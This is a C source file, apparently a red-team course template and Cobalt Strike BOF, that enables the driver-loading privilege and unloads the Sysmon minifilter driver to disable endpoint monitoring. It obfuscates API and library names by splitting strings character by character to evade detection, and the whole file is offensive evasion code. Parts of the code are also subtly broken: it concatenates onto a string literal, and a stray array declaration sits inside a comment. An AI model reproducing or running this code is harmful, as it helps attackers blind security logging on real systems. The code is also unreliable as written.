/*
 // TODO: Use function obfuscation on FilterLoad API
 // TODO: Use function obfuscation on FilterUnload API
 
 Red Team Operator course code template
 Sysmon minifilter unload
 
 author: reenz0h (twitter: @SEKTOR7net)

*/


#include "eva-sysmon-unload-bof-imports.h"
#include "eva-sysmon-unload-bof-structs.h"

typedef HRESULT (WINAPI * FilterLoad_t)(LPCWSTR lpFilterName);
typedef HRESULT (WINAPI * FilterUnload_t)(LPCWSTR lpFilterName);

BOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) {
	HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
		PRINT("[-] OpenProcessToken() failed!\n");
		return FALSE;
	}

    if (!LookupPrivilegeValueA(
            NULL,            // lookup privilege on local system
            lpszPrivilege,   // privilege to lookup 
            &luid ) )        // receives LUID of privilege
    {
        PRINT("[-] LookupPrivilegeValue error: %u\n", GetLastError() ); 
        return FALSE; 
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    if (bEnablePrivilege){
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    } else {
        tp.Privileges[0].Attributes = 0;
	}

    // Enable the privilege or disable all privileges.

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES) NULL, (PDWORD) NULL) ) { 
          PRINT("[-] AdjustTokenPrivileges error: %u\n", GetLastError() ); 
          return FALSE; 
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
          PRINT("[-] The token does not have the specified privilege.\n");
          return FALSE;
    }
    return TRUE;
}

#ifdef BOF

// Usage: eva-sysmon-unload
void go(char *args, int alen) {
	if (!SetPrivilege(SE_LOAD_DRIVER_NAME, ENABLE)) {
		PRINT("Failed to set the privilege for unloading the sysmon driver...\n");
		return;
	}
	
	PRINT("[+] Unloading sysmon minidriver...");
	
	// use function obfuscation on 'FilterLoad' and 'FilterUnload'
	// Dependency: FltLib.dll	unsigned char sEtwEventWrite[] = { 'E','t','w','E','v','e','n','t','W','r','i','t','e', 0x0 };

	unsigned char sFilterLoad[] = { 'F','i','l','t','e','r','L','o','a','d', 0x00 }; 			
	unsigned char sFilterUnload[] = { 'F','i','l','t','e','r','U','n','l','o','a','d', 0x00 };  
	char * lib = "F";
	MSVCRT$strcat(lib,"l");
	MSVCRT$strcat(lib,"t");
	MSVCRT$strcat(lib,"L");
	MSVCRT$strcat(lib,"i");
	MSVCRT$strcat(lib,"b");
	MSVCRT$strcat(lib,".");
	MSVCRT$strcat(lib,"d");
	MSVCRT$strcat(lib,"l");
	MSVCRT$strcat(lib,"l");
	FilterLoad_t pFilterLoad 		= GetProcAddress(GetModuleHandle(lib), sFilterLoad);
	FilterUnload_t pFilterUnload 	= GetProcAddress(GetModuleHandle(lib), sFilterUnload);

	//HRESULT hres = pFilterLoad(L"ofltdrv");
	HRESULT hres = pFilterUnload(L"ofltdrv");
	if (hres == S_OK) {
		PRINT("[+] Done.\n");
	} else {
		PRINT("[-] Failed.\n");
	}
	
	return;
}

#else

int main() {
	if (!SetPrivilege(SE_LOAD_DRIVER_NAME, ENABLE)) {
		PRINT("Failed to set the privilege for unloading the sysmon driver...\n");
		return;
	}
	
	PRINT("[+] Unloading sysmon minidriver...");
	
	// use function obfuscation on 'FilterLoad' and 'FilterUnload'
	// Dependency: FltLib.dll	unsigned char sEtwEventWrite[] = { 'E','t','w','E','v','e','n','t','W','r','i','t','e', 0x0 };

	unsigned char sFilterLoad[] = { 'F','i','l','t','e','r','L','o','a','d', 0x00 }; 			
	unsigned char sFilterUnload[] = { 'F','i','l','t','e','r','U','n','l','o','a','d', 0x00 };  
	char * lib = "F";
	strcat(lib,"l");
	strcat(lib,"t");
	strcat(lib,"L");
	strcat(lib,"i");
	strcat(lib,"b");
	strcat(lib,".");
	strcat(lib,"d");
	strcat(lib,"l");
	strcat(lib,"l");
	FilterLoad_t pFilterLoad 		= GetProcAddress(GetModuleHandle(lib), sFilterLoad);
	FilterUnload_t pFilterUnload 	= GetProcAddress(GetModuleHandle(lib), sFilterUnload);

	//HRESULT hres = pFilterLoad(L"ofltdrv");
	HRESULT hres = pFilterUnload(L"ofltdrv");
	if (hres == S_OK) {
		PRINT("[+] Done.\n");
	} else {
		PRINT("[-] Failed.\n");
	}
	
	return 0;
}

#endif
